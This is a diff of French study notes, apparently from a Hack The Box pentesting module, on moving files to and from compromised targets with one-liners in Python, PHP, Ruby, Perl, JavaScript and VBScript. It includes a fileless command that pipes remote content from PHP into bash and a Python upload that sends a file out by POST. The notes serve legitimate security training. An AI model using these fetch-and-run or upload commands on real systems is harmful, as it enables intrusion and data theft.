@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-21T12:15:59.193Z
+date: 2025-04-21T12:21:17.434Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -503,7 +503,7 @@ ruby -run -ehttpd . -p8000
 
 ## Transferring Files with Code
 
-Il est courant que différents langages de programmation soient présents sur les cibles. Certains langages comme Python, php, perl ou ruby sont souvent présents sur les distributions Linux, mais peuvent aussi être installés dans des environements Windows (bien que cela soit moins probable).
+Il est courant que différents langages de programmation soient présents sur les cibles. Certains langages comme Python, php, perl ou ruby sont souvent présents sur les distributions Linux, mais peuvent aussi être installés dans des environnements Windows (bien que cela soit moins probable).
 
 Sur Windows, il est possible d'utiliser des applications natives comme [cscript](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/cscript) ou [mshta](https://www.malekal.com/mshta-exe-fichier-hta-malwares/) pour exécuter du code JavaScript ou VBScript.
 
@@ -511,24 +511,27 @@ Sur Windows, il est possible d'utiliser des applications natives comme [cscript]
 
 Python est populaire et peut exécuter des commandes en une ligne avec `-c`.
 
-Télécharger un fichier avec urllib et Python 2.7 (Anciens environements):
+Télécharger un fichier avec urllib et Python 2.7 (Anciens environnements):
+
 ```
 python2.7 -c 'import urllib; urllib.urlretrieve("<uri>", "<fichier>")'
 ```
 
 Télécharger un fichier avec urllib et Python 3:
+
 ```
 python3 -c 'import urllib.request; urllib.request.urlretrieve("<uri>", "<fichier>")'
 ```
 
 ### PHP
 
-La grande majoritée des sites internet utilisent PHP ([source](https://w3techs.com/technologies/details/pl-php)).
+La grande majorité des sites internet utilisent PHP ([source](https://w3techs.com/technologies/details/pl-php)).
 
 Il est possible d'utiliser [File_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) pour télécharger le contenu depuis un serveur web et [file_put_contents()](https://www.php.net/manual/en/function.file-put-contents.php) pour écrire le fichier sur le disque.
 Php peut être utilisé pour exécuter des one-liners depuis la ligne de commande avec l'option `-r`
 
 Exemple de commande pour télécharger un fichier avec la fonction php `File_get_contents()`:
+
 ```
 php -r '$file = file_get_contents("<uri>"); file_put_contents("<fichier>",$file);'
 ```
@@ -536,13 +539,15 @@ php -r '$file = file_get_contents("<uri>"); file_put_contents("<fichier>",$file)
 Comme alternative il est possible d'utiliser [Fopen()](https://www.php.net/manual/en/function.fopen.php).
 
 Exemple de commande pour télécharger un fichier avec la fonction php `Fopen()`:
+
 ```
 php -r 'const BUFFER = 1024; $fremote = fopen("<uri>", "rb"); $flocal = fopen("<fichier>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
 
-Il est aussi possible d'utiliser la fonction de piping comme vu précedemment pour effectuer une opération sans écrire sur le disque (sans-fichier/fileless).
+Il est aussi possible d'utiliser la fonction de piping comme vu précédemment pour effectuer une opération sans écrire sur le disque (sans-fichier/fileless).
 
 Par exemple pour exécuter le contenu du fichier avec Bash:
+
 ```
 php -r '$lines = @file("<uri>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
@@ -552,11 +557,13 @@ php -r '$lines = @file("<uri>"); foreach ($lines as $line_num => $line) { echo $
 Ruby et Perl permettent aussi d'exécuter des commandes en une ligne avec -e et de transférer des fichiers.
 
 Exemple avec Ruby:
+
 ```
 ruby -e 'require "net/http"; File.write("<fichier>", Net::HTTP.get(URI.parse("<uri>")))'
 ```
 
 Exemple avec Perl:
+
 ```
 perl -e 'use LWP::Simple; getstore("<uri>", "<fichier>");'
 ```
@@ -568,6 +575,7 @@ JavaScript est un langage de scripting qui permet d'ajouter des fonctionnalités
 Le code suivant (basé sur ce [post](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)) peut être utilisé pour télécharger un fichier.
 
 Créer un fichier js contenant:
+
 ```
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
@@ -579,7 +587,8 @@ BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile(WScript.Arguments(1));
 ```
 
-Il est ensuite possible d'utiliser cscript.exe pour executer le code Javascript:
+Il est ensuite possible d'utiliser cscript.exe pour exécuter le code Javascript:
+
 ```
 cscript.exe /nologo <fichier Javascript> <uri> <fichier>
 ```
@@ -591,6 +600,7 @@ cscript.exe /nologo <fichier Javascript> <uri> <fichier>
 Le code suivant (basé sur ce [post](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs)) peut être utilisé pour télécharger un fichier.
 
 Créer un fichier vbs contenant:
+
 ```
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
@@ -605,10 +615,20 @@ with bStrm
 end with
 ```
 
-Il est ensuite possible d'utiliser cscript.exe pour executer le script:
+Il est ensuite possible d'utiliser cscript.exe pour exécuter le script:
+
 ```
 cscript.exe /nologo <fichier vbs> <uri> fichier>
 ```
 
 ### Upload Operations using Python3
 
+Le module Python [requests](https://pypi.org/project/requests/) permet d'envoyer diverses requètes HTTP (GET, POST, PUT...).
+
+Pour envoyer le contenu d'un fichier dans la requête POST avec `requests.post`:
+
+```
+python3 -c 'import requests;requests.post("<uri>",files={"files":open("<fichier>","rb")})'
+```
+
+## Miscellaneous File Transfer Methods
